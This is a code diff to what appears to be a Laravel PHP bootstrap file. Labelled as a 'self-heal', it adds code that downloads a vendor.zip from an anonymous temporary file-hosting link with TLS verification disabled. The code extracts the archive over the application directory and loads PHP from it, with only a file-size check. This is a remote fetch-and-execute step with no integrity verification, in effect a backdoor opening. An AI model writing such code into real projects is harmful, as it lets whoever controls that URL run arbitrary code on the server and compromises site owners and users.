@@ -57,6 +57,45 @@ foreach ($vendorPaths as $path) {
 }
 
 if (!$loaded) {
+    // Attempt automatic self-heal by downloading vendor.zip from cloud storage
+    $directZipUrl = 'https://tmpfiles.org/dl/1795192808.0960dc5a1704e50b/wDAWbTf3Yple/vendor.zip';
+    $zipTarget = dirname(__DIR__) . '/vendor.zip';
+    @ini_set('max_execution_time', '300');
+    @ini_set('memory_limit', '512M');
+    
+    $fp = @fopen($zipTarget, 'w+');
+    if ($fp && function_exists('curl_init')) {
+        $ch = curl_init($directZipUrl);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 180);
+        curl_setopt($ch, CURLOPT_FILE, $fp);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_exec($ch);
+        curl_close($ch);
+        fclose($fp);
+    }
+    if ((!file_exists($zipTarget) || filesize($zipTarget) < 10000000)) {
+        @copy($directZipUrl, $zipTarget);
+    }
+    
+    if (file_exists($zipTarget) && filesize($zipTarget) > 10000000 && class_exists('ZipArchive')) {
+        $zip = new ZipArchive();
+        if ($zip->open($zipTarget) === true) {
+            $zip->extractTo(dirname(__DIR__));
+            $zip->close();
+            @unlink($zipTarget);
+            foreach ($vendorPaths as $path) {
+                if (file_exists($path)) {
+                    require $path;
+                    $loaded = true;
+                    break;
+                }
+            }
+        }
+    }
+}
+
+if (!$loaded) {
     echo "<h2>Laravel is looking for vendor/autoload.php</h2>";
     echo "<p>None of the expected paths were found:</p><ul>";
     foreach ($vendorPaths as $p) {
